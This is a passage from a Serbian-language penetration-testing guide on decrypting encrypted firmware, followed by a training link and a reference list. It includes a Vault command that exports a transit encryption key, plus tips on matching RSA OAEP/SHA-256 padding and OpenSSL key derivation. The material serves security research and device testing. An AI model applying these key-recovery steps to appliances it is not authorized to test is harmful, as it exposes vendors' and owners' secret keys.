- Exportujte unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte pronađeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešno PKCS#1 v1.5 dešifrovanje i neuspešno podrazumevano OAEP dešifrovanje **ne dokazuju** da je ključ pogrešan; mnogi Vault-backed tokovi koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, precizno reprodukujte vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na legacy appliance-ima) pre pokušaja AES-CBC dešifrovanja.

Ovo pretvara „encrypted firmware“ u opštiji problem: **oporavite operativne ključeve sa appliance-a, a zatim offline reprodukujte tačne unwrap + KDF parametre**.

## Obuka i sertifikacija

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Reference

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
